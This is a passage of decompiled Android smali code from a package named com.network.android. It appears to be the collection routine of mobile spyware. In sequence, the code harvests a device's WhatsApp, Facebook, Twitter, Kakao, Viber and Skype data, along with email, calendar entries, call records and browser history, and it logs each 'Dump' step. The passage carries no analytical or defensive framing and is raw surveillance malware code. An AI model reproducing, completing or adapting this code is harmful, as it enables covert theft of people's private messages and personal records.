    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0, v0, v2}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_2
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    :goto_9
    :try_start_a
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/o;

    invoke-direct {v2}, Lcom/network/media/o;-><init>()V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_1

    :catch_2
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Dump dumpCall Call Exception- "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_9

    :catch_3
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Dump innerDump getBrowserHistory Exception- "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_a
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_a} :catch_0
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    goto/16 :goto_2

    :cond_2
    const-wide/16 v4, 0x3

    :try_start_b
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    const-string v0, "Dump innerDump whatsapp Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/m;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump whatsapp End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "Dump innerDump Facebook Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/d/a;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump Facebook End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "Dump innerDump Twitter Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/d/g;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump Twitter End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "Dump innerDump Kakao Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/d/c;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump Kakao End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "Dump innerDump Viber Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/d/i;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump Viber End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "Dump innerDump Skype Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    const/4 v2, 0x1

    invoke-static {v0, p0, v2}, Lcom/network/android/d/e;->a(Landroid/os/Handler;Landroid/content/Context;Z)V

    const-string v0, "Dump innerDump Skype End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_4
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    :goto_a
    :try_start_c
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/j;

    invoke-direct {v2}, Lcom/network/media/j;-><init>()V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_3

    :catch_4
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Dump dumpIM  Exception- "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_0
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    goto :goto_a

    :cond_3
    const-wide/16 v4, 0x3

    :try_start_d
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    const-string v0, "Dump innerDump mail Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    invoke-static {p0, v0}, Lcom/network/android/r;->a(Landroid/content/Context;Landroid/os/Handler;)V

    const-string v0, "Dump innerDump mail End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Throwable; {:try_start_d .. :try_end_d} :catch_5
    .catchall {:try_start_d .. :try_end_d} :catchall_0

    :goto_b
    :try_start_e
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/k;

    invoke-direct {v2}, Lcom/network/media/k;-><init>()V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_4

    :catch_5
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Dump innerDump dumpMails Exception- "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_e
    .catch Ljava/lang/Throwable; {:try_start_e .. :try_end_e} :catch_0
    .catchall {:try_start_e .. :try_end_e} :catchall_0

    goto :goto_b

    :cond_4
    const-wide/16 v4, 0x3

    :try_start_f
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    const-string v0, "Dump dumpCalander Calendar Start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    invoke-static {v3, v0, p0}, Lcom/network/a/a;->a(Landroid/content/ContentResolver;Landroid/os/Handler;Landroid/content/Context;)V

    const-string v0, "Dump dumpCalander Calendar End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Throwable; {:try_start_f .. :try_end_f} :catch_6
    .catchall {:try_start_f .. :try_end_f} :catchall_0

    :goto_c
    :try_start_10
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/i;

    invoke-direct {v2}, Lcom/network/media/i;-><init>()V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_5

    :catch_6
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Dump dumpCalander Calendar Exception- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_10
    .catch Ljava/lang/Throwable; {:try_start_10 .. :try_end_10} :catch_0
    .catchall {:try_start_10 .. :try_end_10} :catchall_0

    goto :goto_c

    :cond_5
    const/4 v2, 0x0

    const/16 v3, 0x7d3

    :try_start_11
    const-string v4, ""

    const/4 v5, 0x0

    invoke-static {v2, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_0

    goto/16 :goto_8
.end method

.method public static b(Ljava/lang/String;)V
    .locals 4

    sget-object v0, Lcom/network/media/f;->l:Landroid/os/Handler;

    new-instance v1, Lcom/network/media/g;

    invoke-direct {v1, p0}, Lcom/network/media/g;-><init>(Ljava/lang/String;)V

    const-wide/16 v2, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
